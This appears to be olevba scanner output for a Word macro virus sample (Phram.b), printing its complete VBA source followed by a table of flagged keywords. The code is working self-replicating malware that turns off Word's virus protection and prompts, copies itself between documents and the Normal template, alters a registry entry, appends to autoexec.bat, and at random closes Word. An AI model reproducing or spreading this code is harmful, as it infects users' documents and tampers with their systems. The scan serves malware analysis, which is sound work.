olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Phram.b-757de9b257623f6d5bf80aacf0a013c69bea41be
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Phram.b-757de9b257623f6d5bf80aacf0a013c69bea41be - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

'MyName = yGen
'WrittenBy = f0re

On Error Resume Next

CommandBars("Tools").Controls("macro").Visible = False
Application.EnableCancelKey = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") <> "phraming the world into the next millenium" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") = "phraming the world into the next millenium"
End If

NormalInstalled = False
ActiveInstalled = False

Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule

If NT.Lines(3, 1) = "'MyName = yGen" Then NormalInstalled = True
If AD.Lines(3, 1) = "'MyName = yGen" Then ActiveInstalled = True

If NormalInstalled = True And ActiveInstalled = True Then GoTo PhrameEnd

If NormalInstalled = False Then
    Set Infection = NT
    Set Carrier = AD
    Vircode = "Sub Document_Open()" & Chr(13) & Chr(10)
Else
    Set Infection = AD
    Set Carrier = NT
    Vircode = "Sub Document_Close()" & Chr(13) & Chr(10)
End If

With Carrier
    For X = 2 To .CountOfLines
        Vircode = Vircode & .Lines(X, 1) & Chr(13) & Chr(10)
        If .Lines(X, 1) = "End Sub" Then Exit For
    Next X
End With

With Infection
        .DeleteLines 1, .CountOfLines
        .InsertLines 1, Vircode
End With

If Norminstalled = False Then NormalTemplate.Save
If ActiveInstalled = False Then ActiveDocument.Save

PhrameEnd:

Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
Targ = Mid(Root, 1, 3)

Open Targ + "autoexec.bat" For Append As #1
        Print #1, "pause"
Close #1

Rndnm = Int((Rnd() * 15) + 1)
If Rndnm = 15 Then

    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdWhite
    Selection.TypeText "phraming the world into the next millenium"
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.HomeKey Unit:=wdLine
    Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
    Selection.LanguageID = wdNoProofing
    Selection.HomeKey Unit:=wdStory

    ToolsCustomizeKeyboard.KeyCode = 27
    ToolsCustomizeKeyboard.Category = 1
    ToolsCustomizeKeyboard.Name = "Cancel"
    ToolsCustomizeKeyboard.Remove
    ToolsCustomizeKeyboard.Context = 0
    
    SendKeys "%" + "{F4}"

End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

